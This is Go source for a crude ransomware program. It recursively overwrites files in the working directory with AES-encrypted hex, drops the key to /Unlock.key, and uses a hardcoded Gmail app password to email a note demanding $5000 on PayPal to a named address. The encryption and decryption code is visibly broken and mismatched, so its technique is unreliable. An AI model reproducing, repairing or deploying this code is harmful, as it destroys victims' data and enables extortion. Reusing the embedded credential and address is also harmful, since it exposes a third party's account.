package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/smtp"
	"os"
)

var key = []byte(RandString(32))

func RandString(n int) string {
	var s string

	var CA = [64]string{
		"a", "b", "c", "d", "e", "f", "g", "h",
		"i", "j", "k", "l", "m", "n", "o", "p",
		"q", "r", "s", "t", "u", "v", "w", "x",
		"y", "z", "0", "1", "2", "3", "4", "5",
		"6", "7", "8", "9", "A", "B", "C", "D",
		"E", "F", "G", "H", "I", "J", "K", "L",
		"M", "N", "O", "P", "Q", "R", "S", "T",
		"U", "V", "W", "X", "Y", "Z"}

	var i = n

	for i > 0 {
		var r = rand.Intn(63)
		s = fmt.Sprintf("%s%s", s, CA[r])

		i -= 1
	}

	return s
}

func EncryptAES(key []byte, plaintext string) string {
	// create cipher
	c, err := aes.NewCipher(key)

	if err != nil {
		log.Fatal(err)
	}

	// allocate space for ciphered data
	out := make([]byte, len(plaintext))

	// encrypt
	c.Encrypt(out, []byte(plaintext))
	// return hex string
	return hex.EncodeToString(out)
}

func decrypt(data []byte, passphrase string) []byte {
	key := []byte(passphrase)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func EncryptFile(path string) {

	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

l1:
	for _, f := range files {
		var n = f.Name()
		if f.IsDir() {
			var filePath = fmt.Sprintf("%s/%s", path, n)
			EncryptFile(filePath)

			continue l1
		}

		if n == "go.mod" || n == "main.go" || n == "main.exe" || n == "go.sum" {
			continue l1
		}

		var p = fmt.Sprintf("%s/%s", path, n)
		var cont, _ = os.ReadFile(p)

		var enc = EncryptAES(key, string(cont))
		os.WriteFile(p, []byte(enc), 0666)
	}

	var f, _ = os.Create("/Unlock.key")

	f.Write(key)
	f.Chmod(0444)
	f.Close()
}

var appPassword = "xiwbfznvkrhxbutq"

func SendMail(t string, from string, to string, mainPart string, subject string) {
	// hostname is used by PlainAuth to validate the TLS certificate.
	if t == "text/plain" {
		hostname := "smtp.gmail.com"
		auth := smtp.PlainAuth("", from, appPassword, hostname)

		msg := fmt.Sprintf("To: %s From: %s\nSubject: %s\n%s", to, from, subject, mainPart)
		err := smtp.SendMail(hostname+":587", auth, from, []string{to},
			[]byte(msg))
		if err != nil {
			log.Fatal(err)
		}
	}
}

func main() {
	fmt.Print("Enter your email address: ")
	var m string

	fmt.Scanln(&m)

	EncryptFile("./")

	SendMail("text/plain", m, "tm.ahad.07@gmail.com",
		`Give me 5000$ on PayPal! Or I didn't Unlock your file
		To unlock our files:
		1. Pay $5000 on PayPal
		2. SAVE the Unlock.key file on your desktop`, "Give me money")
}
